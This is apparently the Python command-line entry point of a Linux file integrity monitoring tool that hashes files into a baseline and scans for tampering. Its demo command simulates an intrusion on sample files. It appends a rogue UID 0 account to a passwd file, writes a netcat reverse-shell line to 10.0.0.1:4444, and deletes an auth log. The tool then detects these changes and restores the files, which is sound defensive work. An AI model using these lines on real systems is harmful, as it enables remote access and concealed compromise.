#!/usr/bin/env python3
"""
Linux File Integrity Monitoring (FIM) Utility
Command Line Interface (CLI)

Usage:
  python main.py init [--config CONFIG] [--force]
  python main.py scan [--config CONFIG] [--baseline BASELINE] [--format {markdown,json,text,all}]
  python main.py status [--config CONFIG] [--baseline BASELINE]
  python main.py update [--config CONFIG] [--force]
  python main.py verify <file_path> [--baseline BASELINE]
  python main.py demo
"""

from __future__ import annotations

import argparse
import json
import os
import shutil
import sys
from pathlib import Path
from typing import Any, Dict, List, Optional

from fim.audit_logger import AuditLogger
from fim.baseline import BaselineManager
from fim.comparison import IntegrityComparator
from fim.hashing import inspect_file
from fim.report_generator import ReportGenerator
from fim.scanner import FileScanner


DEFAULT_CONFIG_PATH = "config/monitor_config.json"


def load_configuration(config_path: str = DEFAULT_CONFIG_PATH) -> Dict[str, Any]:
    """Load configuration JSON or return resilient defaults if missing."""
    cfg_file = Path(config_path)
    if not cfg_file.is_file():
        return {
            "settings": {
                "hash_algorithm": "sha256",
                "chunk_size_bytes": 65536,
                "follow_symlinks": False,
                "baseline_file": "baseline.json",
                "log_file": "logs/fim_audit.log",
                "events_jsonl": "logs/fim_events.jsonl",
                "reports_dir": "reports",
            },
            "monitoring": {
                "monitored_paths": ["sample-data/etc", "sample-data/bin", "sample-data/var/log"],
                "exclude_patterns": ["*.tmp", "*.swp", "*.bak", "*.pyc", "__pycache__/*", "*.git/*"],
                "critical_path_patterns": ["*passwd*", "*shadow*", "*sudoers*", "*sshd_config*", "*/bin/*", "*/sbin/*"],
            },
            "reporting": {
                "default_format": "markdown",
                "auto_save_on_scan": True,
            },
        }

    try:
        with cfg_file.open("r", encoding="utf-8") as f:
            return json.load(f)
    except Exception as err:
        print(f"[!] Warning: Could not parse config '{config_path}': {err}. Using default fallback configuration.")
        return load_configuration("__non_existent__")


# ============================================================================
# Command Handlers
# ============================================================================

def cmd_init(args: argparse.Namespace) -> int:
    """Initialize a cryptographic baseline of monitored targets."""
    config = load_configuration(args.config)
    settings = config.get("settings", {})
    monitoring = config.get("monitoring", {})

    baseline_path = args.output or settings.get("baseline_file", "baseline.json")
    mgr = BaselineManager(baseline_path)
    logger = AuditLogger(
        log_file=settings.get("log_file", "logs/fim_audit.log"),
        events_jsonl=settings.get("events_jsonl", "logs/fim_events.jsonl")
    )

    if mgr.exists() and not args.force:
        logger.warning(f"Baseline already exists at '{baseline_path}'.")
        print(f"\n[!] Existing baseline found at '{baseline_path}'.")
        confirm = input("Are you sure you want to overwrite the existing baseline? (y/N): ").strip().lower()
        if confirm not in ("y", "yes"):
            print("[-] Baseline creation aborted by user.")
            return 1

    monitored_paths = args.targets or monitoring.get("monitored_paths", ["sample-data/etc"])
    print(f"\n[*] Initializing FIM Baseline...")
    print(f"[*] Target paths: {', '.join(monitored_paths)}")
    print(f"[*] Cryptographic algorithm: SHA-256")

    scanner = FileScanner(
        monitored_paths=monitored_paths,
        exclude_patterns=monitoring.get("exclude_patterns", []),
        chunk_size=settings.get("chunk_size_bytes", 65536),
        follow_symlinks=settings.get("follow_symlinks", False),
    )

    records, errors, stats = scanner.scan()

    if errors:
        for err in errors:
            logger.warning(f"Scan warning for {err['path']}: {err['error']}")

    baseline_data = mgr.create(
        file_records=records,
        monitored_paths=monitored_paths,
        hash_algorithm=settings.get("hash_algorithm", "sha256"),
    )

    logger.log_event(
        event_type="BASELINE_CREATED",
        severity="INFO",
        message=f"Cryptographic baseline established ({len(records)} files indexed).",
        extra_data={"baseline_path": str(baseline_path), "total_files": len(records), "stats": stats}
    )

    print(f"[+] Baseline successfully established at '{baseline_path}'.")
    print(f"    - Total Files Cataloged: {stats['total_files']}")
    print(f"    - Total Bytes Hashed:    {stats['total_bytes']:,} bytes")
    print(f"    - Execution Duration:    {stats['duration_seconds']}s")
    print(f"    - Catalog Checksum:      {baseline_data['catalog_checksum'][:16]}...\n")
    return 0


def cmd_scan(args: argparse.Namespace) -> int:
    """Execute an integrity verification scan against the saved baseline."""
    config = load_configuration(args.config)
    settings = config.get("settings", {})
    monitoring = config.get("monitoring", {})

    baseline_path = args.baseline or settings.get("baseline_file", "baseline.json")
    mgr = BaselineManager(baseline_path)
    logger = AuditLogger(
        log_file=settings.get("log_file", "logs/fim_audit.log"),
        events_jsonl=settings.get("events_jsonl", "logs/fim_events.jsonl")
    )
    reporter = ReportGenerator(reports_dir=settings.get("reports_dir", "reports"))

    if not mgr.exists():
        logger.error(f"Cannot scan: baseline file '{baseline_path}' not found.")
        print(f"\n[!] Error: Baseline file '{baseline_path}' does not exist.")
        print("[!] Establish a baseline first by running: python main.py init\n")
        return 1

    baseline_data, load_err = mgr.load()
    if load_err and not baseline_data:
        logger.error(f"Failed to load baseline: {load_err}")
        print(f"\n[!] Baseline Error: {load_err}\n")
        return 1

    if load_err:
        logger.warning(load_err)
        print(f"[!] Warning: {load_err}")

    # Use paths from baseline unless overridden in config
    monitored_paths = baseline_data.get("monitored_paths") or monitoring.get("monitored_paths", [])

    print("\n[*] Starting File Integrity Verification Scan...")
    print(f"[*] Checking against baseline: '{baseline_path}' (Created: {baseline_data.get('created_at')})")

    scanner = FileScanner(
        monitored_paths=monitored_paths,
        exclude_patterns=monitoring.get("exclude_patterns", []),
        chunk_size=settings.get("chunk_size_bytes", 65536),
        follow_symlinks=settings.get("follow_symlinks", False),
    )

    current_records, scan_errors, scan_stats = scanner.scan()

    if scan_errors:
        for err in scan_errors:
            logger.warning(f"File scan warning: {err['path']} - {err['error']}")

    comparator = IntegrityComparator(
        critical_patterns=monitoring.get("critical_path_patterns")
    )
    results = comparator.compare(
        baseline_files=baseline_data.get("files", {}),
        current_files=current_records,
    )

    # Log events based on findings
    counts = results["counts"]
    if results["status"] == "CLEAN":
        logger.log_event(
            event_type="SCAN_CLEAN",
            severity="INFO",
            message=f"Integrity scan clean. All {counts['total_current']} files match baseline.",
            extra_data=counts
        )
    else:
        logger.log_event(
            event_type="INTEGRITY_VIOLATION",
            severity="CRITICAL" if counts["critical_violations"] > 0 else "WARNING",
            message=f"Integrity violations detected! {counts['total_anomalies']} discrepancies found.",
            extra_data=counts
        )

        for anomaly in results["anomalies"]:
            logger.log_event(
                event_type=f"FILE_{anomaly['change_type']}",
                severity=anomaly["severity"],
                message=anomaly["details"],
                file_path=anomaly["path"],
                extra_data=anomaly
            )

    # Print summary to console
    print("\n" + reporter.generate_text_summary(results, scan_stats))

    # Generate persistent reports if requested or configured
    fmt = args.format or config.get("reporting", {}).get("default_format", "markdown")
    save_reports = not args.no_report

    if save_reports:
        if fmt in ("markdown", "all"):
            _, md_path = reporter.generate_markdown(results, scan_stats, baseline_meta=baseline_data)
            print(f"[+] Markdown report saved: {md_path}")

        if fmt in ("json", "all"):
            _, json_path = reporter.generate_json(results, scan_stats)
            print(f"[+] JSON report saved:     {json_path}")

    # Return status exit codes: 0 for clean, 2 for violations, 1 for error
    return 2 if results["status"] != "CLEAN" else 0


def cmd_status(args: argparse.Namespace) -> int:
    """Display the current configuration and baseline status."""
    config = load_configuration(args.config)
    settings = config.get("settings", {})
    baseline_path = args.baseline or settings.get("baseline_file", "baseline.json")
    mgr = BaselineManager(baseline_path)

    print("\n" + "=" * 65)
    print("             LINUX FILE INTEGRITY MONITOR - STATUS")
    print("=" * 65)
    print(f" Config File:          {args.config}")
    print(f" Hash Algorithm:       {settings.get('hash_algorithm', 'sha256').upper()}")
    print(f" Baseline Target:      {baseline_path}")
    print(f" Baseline Exists:      {'YES' if mgr.exists() else 'NO (Baseline missing)'}")

    if mgr.exists():
        data, err = mgr.load()
        if data:
            print(f" Schema Version:       {data.get('schema_version')}")
            print(f" Created Timestamp:    {data.get('created_at')}")
            print(f" Updated Timestamp:    {data.get('updated_at')}")
            print(f" Baseline Hostname:    {data.get('host_context', {}).get('hostname')}")
            print(f" OS Environment:       {data.get('host_context', {}).get('os_name')} {data.get('host_context', {}).get('os_release')}")
            print(f" Total Baseline Files: {data.get('total_files')}")
            print(f" Catalog SHA-256:      {data.get('catalog_checksum')}")
            print(f" Monitored Targets:    {', '.join(data.get('monitored_paths', []))}")
        if err:
            print(f" Baseline Checksum:    {err}")

    log_path = Path(settings.get("log_file", "logs/fim_audit.log"))
    events_path = Path(settings.get("events_jsonl", "logs/fim_events.jsonl"))
    print(f" Text Audit Log:       {log_path} ({'Exists' if log_path.exists() else 'Not initialized'})")
    print(f" SIEM JSONL Log:       {events_path} ({'Exists' if events_path.exists() else 'Not initialized'})")
    print("=" * 65 + "\n")
    return 0


def cmd_update(args: argparse.Namespace) -> int:
    """
    Explicitly update baseline to accept approved modifications.
    Never updates silently. Requires user confirmation or --force.
    """
    config = load_configuration(args.config)
    settings = config.get("settings", {})
    monitoring = config.get("monitoring", {})

    baseline_path = args.baseline or settings.get("baseline_file", "baseline.json")
    mgr = BaselineManager(baseline_path)
    logger = AuditLogger(
        log_file=settings.get("log_file", "logs/fim_audit.log"),
        events_jsonl=settings.get("events_jsonl", "logs/fim_events.jsonl")
    )

    if not mgr.exists():
        print(f"\n[!] Error: No baseline exists at '{baseline_path}'. Run 'init' first.\n")
        return 1

    old_data, _ = mgr.load()
    monitored_paths = (
        old_data.get("monitored_paths")
        if old_data
        else monitoring.get("monitored_paths", ["sample-data/etc"])
    )

    print("\n[!] WARNING: You are about to EXPLICITLY update the security baseline.")
    print("    This will authorize all current file states as the new trusted benchmark.")
    print(f"    Target paths: {', '.join(monitored_paths)}")

    if not args.force:
        confirm = input("\nConfirm explicit baseline update? (y/N): ").strip().lower()
        if confirm not in ("y", "yes"):
            print("[-] Baseline update aborted by user.")
            return 1

    scanner = FileScanner(
        monitored_paths=monitored_paths,
        exclude_patterns=monitoring.get("exclude_patterns", []),
        chunk_size=settings.get("chunk_size_bytes", 65536),
        follow_symlinks=settings.get("follow_symlinks", False),
    )

    records, errors, stats = scanner.scan()
    updated_data, err = mgr.update_explicit(records, monitored_paths=monitored_paths)

    if err:
        logger.error(f"Baseline update error: {err}")
        print(f"[!] Update failed: {err}")
        return 1

    logger.log_event(
        event_type="BASELINE_UPDATED",
        severity="WARNING",
        message=f"Security baseline explicitly refreshed with {len(records)} active files.",
        extra_data={"total_files": len(records), "stats": stats}
    )

    print(f"[+] Baseline successfully refreshed and committed to '{baseline_path}'.")
    print(f"    - Total Files: {stats['total_files']}")
    print(f"    - Catalog Checksum: {updated_data.get('catalog_checksum', '')[:16]}...\n")
    return 0


def cmd_verify(args: argparse.Namespace) -> int:
    """Perform a one-off cryptographic check of a single file against baseline."""
    target_path = Path(args.file)
    baseline_path = args.baseline or "baseline.json"
    mgr = BaselineManager(baseline_path)

    if not mgr.exists():
        print(f"[!] Baseline file '{baseline_path}' not found.")
        return 1

    data, err = mgr.load()
    if not data or "files" not in data:
        print(f"[!] Error loading baseline: {err}")
        return 1

    files_catalog = data["files"]
    norm_key = str(target_path.as_posix())

    if norm_key not in files_catalog:
        print(f"[-] File '{norm_key}' is NOT registered in baseline.")
        return 2

    rec, inspect_err = inspect_file(target_path)
    if inspect_err:
        print(f"[!] Error reading '{target_path}': {inspect_err}")
        return 1

    base_rec = files_catalog[norm_key]
    match = rec["sha256"] == base_rec.get("sha256")

    print("\n" + "=" * 60)
    print(f" File:          {norm_key}")
    print(f" Baseline Hash: {base_rec.get('sha256')}")
    print(f" Current Hash:  {rec['sha256']}")
    print(f" Match Status:  {'MATCH - VERIFIED AUTHENTIC' if match else 'MISMATCH - TAMPERING DETECTED'}")
    print("=" * 60 + "\n")
    return 0 if match else 2


def cmd_demo(args: argparse.Namespace) -> int:
    """
    Automated self-contained security demonstration for presentations and interviews.
    Simulates real-world adversary actions (file modification, backdoor creation, log wiping),
    executes detection scan, and generates incident response artifacts.
    """
    print("\n" + "=" * 70)
    print("       LINUX FILE INTEGRITY MONITOR - ATTACK SIMULATION DEMO")
    print("=" * 70)
    print("This automated scenario simulates a host compromise and demonstrates")
    print("how a SOC Analyst uses FIM to detect and isolate unauthorized alterations.\n")

    demo_dir = Path("sample-data")
    if not demo_dir.exists():
        print("[!] Error: 'sample-data' directory not found.")
        return 1

    # 1. Establish Clean Baseline
    print("[Step 1] Establishing clean security baseline of sample Linux targets...")
    init_args = argparse.Namespace(
        config=DEFAULT_CONFIG_PATH,
        targets=["sample-data/etc", "sample-data/bin", "sample-data/var/log"],
        output="baseline.json",
        force=True
    )
    cmd_init(init_args)

    # Backup original files so we can restore them at the end
    passwd_path = Path("sample-data/etc/passwd")
    login_path = Path("sample-data/bin/login")
    auth_log_path = Path("sample-data/var/log/auth.log")
    backdoor_path = Path("sample-data/bin/backdoor.sh")

    original_passwd = passwd_path.read_bytes() if passwd_path.exists() else b""
    original_auth = auth_log_path.read_bytes() if auth_log_path.exists() else b""

    try:
        # 2. Simulate Attacker Tampering
        print("\n[Step 2] Simulating adversary host actions (MITRE ATT&CK):")

        # Attack 1: Account Manipulation (T1098) - Append rogue UID 0 account
        print("  -> [T1098] Attacker appends rogue backdoor root user to sample-data/etc/passwd")
        with passwd_path.open("ab") as f:
            f.write(b"\nbackdoor:x:0:0:Adversary Injected Backdoor:/root:/bin/bash\n")

        # Attack 2: Persistence / Web Shell Dropper (T1036) - Create rogue script
        print("  -> [T1036] Attacker drops unauthorized backdoor script sample-data/bin/backdoor.sh")
        backdoor_path.write_bytes(b"#!/bin/bash\n/bin/nc -e /bin/bash 10.0.0.1 4444 &\n")

        # Attack 3: Indicator Removal (T1070) - Delete audit log to erase tracks
        print("  -> [T1070] Attacker deletes sample-data/var/log/auth.log to cover tracks")
        if auth_log_path.exists():
            auth_log_path.unlink()

        # 3. Execute Detection Scan
        print("\n[Step 3] Running FIM integrity scan to detect tampering...")
        scan_args = argparse.Namespace(
            config=DEFAULT_CONFIG_PATH,
            baseline="baseline.json",
            format="all",
            no_report=False
        )
        scan_code = cmd_scan(scan_args)

        print("\n[Step 4] Verification of Demonstration Output:")
        print(f"  - Scan Exit Code: {scan_code} (Code 2 indicates security violations detected!)")
        print("  - Audit trail recorded in 'logs/fim_audit.log' and 'logs/fim_events.jsonl'")
        print("  - Incident reports generated in 'reports/' (both Markdown & JSON)")

    finally:
        # 4. Clean up / Restore state
        print("\n[Step 5] Restoring sample files to pristine state...")
        if original_passwd:
            passwd_path.write_bytes(original_passwd)
        if backdoor_path.exists():
            backdoor_path.unlink()
        if original_auth:
            auth_log_path.write_bytes(original_auth)
        print("[+] Environment restored successfully.")

    print("\n" + "=" * 70)
    print(" DEMO COMPLETE: FIM successfully detected all 3 simulated attack vectors!")
    print("=" * 70 + "\n")
    return 0


# ============================================================================
# Argument Parser Setup
# ============================================================================

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="fim",
        description="Linux File Integrity Monitoring (FIM) Utility | Cryptographic Verification & Audit Logging",
        epilog="Designed for SOC Analysts, System Administrators, and Security Engineers.",
    )

    subparsers = parser.add_subparsers(dest="command", help="Operational Subcommands")

    # Command: init
    p_init = subparsers.add_parser("init", help="Establish a new cryptographic baseline database.")
    p_init.add_argument("-c", "--config", default=DEFAULT_CONFIG_PATH, help="Path to monitor_config.json")
    p_init.add_argument("-t", "--targets", nargs="+", help="Specific directories/files to baseline (overrides config)")
    p_init.add_argument("-o", "--output", help="Custom baseline output file (default: from config)")
    p_init.add_argument("-f", "--force", action="store_true", help="Overwrite baseline without confirmation prompt")

    # Command: scan
    p_scan = subparsers.add_parser("scan", help="Scan active filesystem against established baseline.")
    p_scan.add_argument("-c", "--config", default=DEFAULT_CONFIG_PATH, help="Path to monitor_config.json")
    p_scan.add_argument("-b", "--baseline", help="Custom baseline file path")
    p_scan.add_argument("--format", choices=["markdown", "json", "text", "all"], default="markdown", help="Report format")
    p_scan.add_argument("--no-report", action="store_true", help="Do not save persistent report to disk")

    # Command: status
    p_status = subparsers.add_parser("status", help="Inspect baseline state, file count, and host metadata.")
    p_status.add_argument("-c", "--config", default=DEFAULT_CONFIG_PATH, help="Path to monitor_config.json")
    p_status.add_argument("-b", "--baseline", help="Custom baseline file path")

    # Command: update
    p_update = subparsers.add_parser("update", help="Explicitly update baseline after authorized changes.")
    p_update.add_argument("-c", "--config", default=DEFAULT_CONFIG_PATH, help="Path to monitor_config.json")
    p_update.add_argument("-b", "--baseline", help="Custom baseline file path")
    p_update.add_argument("-f", "--force", action="store_true", help="Bypass confirmation prompt")

    # Command: verify
    p_verify = subparsers.add_parser("verify", help="One-off cryptographic verification of a single file.")
    p_verify.add_argument("file", help="Path of the single file to verify")
    p_verify.add_argument("-b", "--baseline", default="baseline.json", help="Path to baseline file")

    # Command: demo
    subparsers.add_parser("demo", help="Run automated end-to-end attack simulation and detection scenario.")

    return parser


def main() -> int:
    parser = build_parser()
    if len(sys.argv) == 1:
        parser.print_help()
        return 0

    args = parser.parse_args()

    commands = {
        "init": cmd_init,
        "scan": cmd_scan,
        "status": cmd_status,
        "update": cmd_update,
        "verify": cmd_verify,
        "demo": cmd_demo,
    }

    handler = commands.get(args.command)
    if handler:
        try:
            return handler(args)
        except KeyboardInterrupt:
            print("\n[-] Operation cancelled by user.")
            return 130
        except Exception as err:
            print(f"[!] Unhandled error: {err}")
            return 1

    parser.print_help()
    return 0


if __name__ == "__main__":
    sys.exit(main())
